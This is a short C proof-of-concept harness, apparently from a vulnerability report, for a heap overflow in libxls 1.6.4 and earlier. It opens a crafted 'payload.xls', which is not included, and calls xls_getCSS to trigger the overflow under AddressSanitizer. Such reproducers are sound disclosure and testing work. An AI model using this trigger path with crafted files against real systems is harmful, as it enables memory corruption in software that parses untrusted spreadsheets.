// libxls <= 1.6.4 - Heap overflow
// compile: clang -fsanitize=address poc.c -I/path/to/include libxls.a -o poc
// run:     ./poc payload.xls

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <xls.h>

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("usage: %s payload.xls\n", argv[0]);
        return 1;
    }

    xls_error_t err = LIBXLS_OK;
    xlsWorkBook *wb = xls_open_file(argv[1], "UTF-8", &err);
    if (!wb) {
        printf("[-] open failed: %s\n", argv[1]);
        return 1;
    }

    xls_parseWorkBook(wb);
    printf("[*] Parsing %u XF styles\n", wb->xfs.count);
    printf("[*] Triggering heap write overflow...\n");

    char *css = xls_getCSS(wb);
    if (css) {
        printf("[+] css len: %zu\n", strlen(css));
        free(css);
    }

    xls_close_WB(wb);
    return 0;
}